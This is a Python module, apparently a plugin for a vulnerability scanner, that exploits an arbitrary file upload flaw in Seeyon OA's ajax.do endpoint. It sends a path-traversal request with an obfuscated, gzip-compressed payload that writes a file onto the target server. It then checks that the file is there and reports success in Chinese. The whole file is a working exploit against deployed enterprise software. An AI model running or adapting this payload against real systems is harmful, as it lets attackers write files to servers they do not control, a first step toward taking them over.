import requests
import re
from bs4 import BeautifulSoup
import logging

uia=''
http = ''
https = ''
def dl201(dl):
    global http,https
    http=dl
    https=dl
def ty(url,s_cookie):
    global uia
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        path = 'seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip'
        header = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded",
            }
        data='managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%0BuTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%AC%C2%8D+c%C2%BB%13%7Bh_%C2%88%28%2A%28%C2%AF%C2%8D%3D%40%15Ba%150%C3%B2%10%C3%AC%C2%98%C3%BF%3E%05%C3%98%C3%9B%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%B7k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%99%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%85t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%9B%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1Da%C3%80%0F%1D%C3%A0%C2%A3%C3%BC%C2%BB%07%06%C3%BD%C2%AC%C3%8C%3A%0F%C3%BF%C2%A23wO%C3%92%C3%80%C3%83%C2%B8ve%27%2670K%2A%C2%97%1B%C2%B3%C3%922%C3%88%5CQ%C2%B8mI-c%C2%91%C2%B3TY0%C2%8B%C2%8B5%C2%97%04%C2%90%C3%8Cs%C3%80%C3%AB%C3%B9%C2%9A%28%C2%85%C2%AB%C2%8D%C3%A5%C3%A3%C3%A0%C2%A58%C2%8A%C2%8B%C3%88%C3%96%24%1F%12%C2%BD%02%1C.%C3%9C%C2%90E%1BmXI%C3%A1%C3%B0%C3%99%C2%89%C2%94%C3%AB%C2%96%C2%A8%09+z%08E%C3%8C%C3%99%C2%9Ap%C2%B5%0C%C2%88%25%11g%40%1CW%C2%B0%C3%86%27%0B%C3%8E%C3%92%C2%84%01%7DO%C3%97%28N%1B%C3%9E%C3%B4s%C2%8B_%09%60%C2%A9%16%C2%9F%C3%8A%28%C2%AEmlr%19I%C3%85.%2C%C2%BF%03%C3%BE%C3%A5%C2%AB-%C3%AA%C2%A1%2B.%2A%C3%8BT%13%C2%97%1B%3EJ%C2%A2%C2%92Z%C2%A6r%C2%93%16G%C3%9F6%03%C3%966%C2%843%C2%A8%263%C2%AAs%03lYX%C2%86%C2%8AA%C2%94%C3%A9%C3%B2%C2%BC%C3%95%3B%C2%88%C3%A3%C2%80bT%C2%92%C2%B8I%3C%5E%19%00J%C3%8B%C2%94%C3%9E%C3%B2%C2%83%2B4V%C2%A9cl%C3%BC%3DW%06%C2%80%C3%9F%C3%B8v%15+%C3%8FT%C2%B1%C2%B4%C3%88%C2%A0%C2%85%C3%B0%C2%88%C3%86%C3%87Bs%C2%95K%C3%8B%C3%96nMTl%13%C2%9C%C3%9B%C3%87%16%5B%16%C2%A5t3-%C3%91%C2%9A%C2%94%C3%98%25%C2%90u%C2%A6%C3%A7%C3%91%C3%89d%C2%9FiN%C3%AB%C2%BC%C2%9Fm%C2%A3%C3%96%5B%054%074%7F%C3%B7%C2%BCEJ%08%08%C2%BEB%C2%B1%C3%84p%26%1C%C3%A0r%C2%95%C2%B8%04%C3%B8%C3%8E%C2%8DE%C3%B6a%3F%C2%B0%0F%C2%9Bjk%C3%98%C3%98%0A%C3%B5%C3%B3%C3%B6+%0D%2C%24%C2%8D%00%C2%A7%C3%9F%C2%9A%1A+%C3%A1%0AM%C3%95%C2%B0%C2%8Cr%60k%3E%C2%82%C2%9A%C2%94%3A%C3%95y%C2%B4%C3%A7%C3%B0%C3%95ic%1C%C2%BF%C3%91k%021%C2%9CcZW5p%C2%89%C2%82%C3%A5%C3%A9j%C2%A2%C3%AA%1B%24%1F%C2%B2pMcp%C3%8C%7D%C2%BCAen%C2%9B%C3%80%3FrzX%C3%87%C2%AAq%C2%BAp%C3%A4%27%C3%98%C2%AA%C3%BC%C3%B8%C3%83%C2%9F%C2%91%C3%BD%C3%AB%C2%9F%C2%89%5CIH%C3%96%1A%C3%B9%C2%B4%C3%8E%17%C2%A8%C3%BCd%C3%BD%C2%86%C2%AF%C2%9DG.%C3%91yZ%C2%9F%18%C2%8AA%02%C2%AAF%C2%AF%C2%ADO%C2%AD%C3%97%C3%B8%C3%B5km%C3%A4%C3%A9%C2%99%C3%8AAlU%C3%82%C3%99em%C2%9A%C2%8FE%2A%C2%8B%02%C2%86%C3%95%C3%A4%06%C2%8Da%C3%AE%1A%C3%B8F%C3%9F%C2%A6%7B%5DY%28%C2%A1%3A%C2%A7y-%C3%AEvy%C3%93%1F%C2%9C%C2%8A%C3%B7%C2%91Nl%C3%9A%C2%AB%C3%B2r%C2%85%C2%81%C2%A9c%C3%80%C3%AFs%C2%9B%C3%93%C3%99%23%C3%91%C3%9F%C3%BE%C3%88AM%C3%93%C3%A1u%C3%891%C2%A6%7E%264%06%1A%3F%5C%C2%B9%C2%91%C3%82Z%C2%86%10%C3%92%C3%B8%C2%A8%1Fz%09%C2%8DE%0A%C2%AA%C2%A0%C3%A9%C3%A9%3D7%C3%8E%C2%A1%C2%A8%0F%21%C2%AD%C3%ADn%3Anz%12pJ%C3%A5%C2%98%13%C3%96%15uv%17%5E%C2%8B%C2%B6%C2%AE%C2%AB%C3%82%C3%A5%C3%B7%C2%8F%C3%AF%C3%83%C3%8E%C2%A4y%C3%94%27%28%05%C3%BD%C3%89%C2%8B6%C3%BF%3A%C2%9Cy+%C2%86t%C3%9E%C3%A1%C3%BDnG%C3%BDs%C2%A5%C3%9E%7F%C2%A7%C2%BA5%C2%BB3%C2%ADm%C3%8B%C3%B4%C3%AE%C2%80%C3%BD%C3%B6%C2%9E%C3%A4%C2%A7%13%05h%C2%96%C3%80%C3%83%C2%97%C3%8E%C3%B1%C2%B0%C3%B8%C3%A3%C3%B9%C3%A3%C2%92%C3%B8%C2%B8n%C3%BA%0D%C2%83%C2%A3%C3%9EG%C3%B0%C3%BF%C3%93%058N%3D%C3%AA%C3%98%C2%8Fo%C3%B5%3A%C2%A4%04%C3%B4NL%C2%9A9%19%02LY%C2%96%C2%BD%C2%87%C3%97%C3%AE%0F%C2%BA%23%C3%A9%C2%9E%7C%C2%AD%C3%AF%C3%AC%C2%92%7B%C3%9D%7F%7E%02%60%01%C3%A2B%5E%05%00%00'
        logging.captureWarnings(True)
        gf = requests.post(url+path, data=data, cookies=s_cookie, headers=header, proxies=proxies, verify=False)
        if gf.status_code == 500 and '"message":null' in gf.text:
            gf1 = requests.get(url + "seeyon/5134acgiuqec1.txt", cookies=s_cookie,proxies=proxies, verify=False)
            if 'e45e329feb5d925' in gf1.text:
                uia = '[+]漏洞存在\n文件上传成功:\n%sseeyon/5134acgiuqec1.txt\n\n%s'%(url,gf1.text)
            else:
                uia = "[-]漏洞不存在"
        else:
            uia = "[-]漏洞不存在"
    except Exception as aaa:
        uia = '[-]请求错误\n' + str(aaa)
def yt1():
    global uia
    return '--------------------------------------------------\n[ 致远OA ajax.do 任意文件上传 ]\n\n'+ str (uia)+'\n'
def yt1a(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        ty(url1,s_cookie)
    elif pd=='1':
        ty(url1,s_cookie)